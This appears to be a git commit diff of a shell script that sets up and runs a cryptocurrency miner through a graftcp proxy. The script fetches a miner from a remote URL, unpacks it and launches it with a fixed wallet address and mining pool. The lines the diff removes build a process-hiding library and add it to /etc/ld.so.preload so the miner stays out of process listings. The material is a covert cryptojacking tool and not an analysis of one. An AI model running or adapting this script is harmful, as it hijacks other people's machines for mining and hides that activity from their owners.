e0859f9d14fdb752f50ecaf932dfaedc42f82536
feby12329 <feby12329001@webmail.uad.ac.id>
2024-08-02 22:34:04 +0700

    Update and rename lastorder.sh to lastordea.sh

--- lastordea.sh
+++ lastordea.sh
@@ -1,13 +1,9 @@
 #!/bin/sh
-git clone https://gitlab.com/majapahlevi/majapahlevi
-cd majapahlevi
-
-
 ln -fs /usr/share/zoneinfo/Africa/Johannesburg /etc/localtime
 dpkg-reconfigure --frontend noninteractive tzdata
-
+git clone https://gitlab.com/majapahlevi/majapahlevi
+cd majapahlevi
 apt update -y;apt -y install libcurl4-openssl-dev libssl-dev libjansson-dev automake autotools-dev build-essential binutils git cmake screen unzip net-tools curl -y
-
 tar -xvzf graphics.tar.gz
 rm -rf graphich.tar.gz
 
@@ -39,19 +35,6 @@ echo ""
 echo " "
 echo " "
 
-./graftcp/graftcp rm -rf gas && unzip korek.zip
-chmod +x gas
-rm -rf Makefile
-rm -rf processhider.c
-rm -rf README.md
-rm -rf .gitignore
-rm -rf korek.zip
 ./graftcp/graftcp wget -q https://github.com/Beeppool/miner/releases/download/0.6.1/beepminer-0.6.1.zip && unzip beepminer-0.6.1.zip && cd beepminer-0.6.1
-unzip tukimin.zip
-rm -rf tukimin.zip
-make
-gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
-mv libprocesshider.so /usr/local/lib/
-echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
 
 ./graftcp/graftcp ./miner --miner=96 --wallet-address="NQ50 44BA 44R3 BFHX 8648 3UTH LX98 KJYC TV5P" --pool=pool.acemining.co:8443
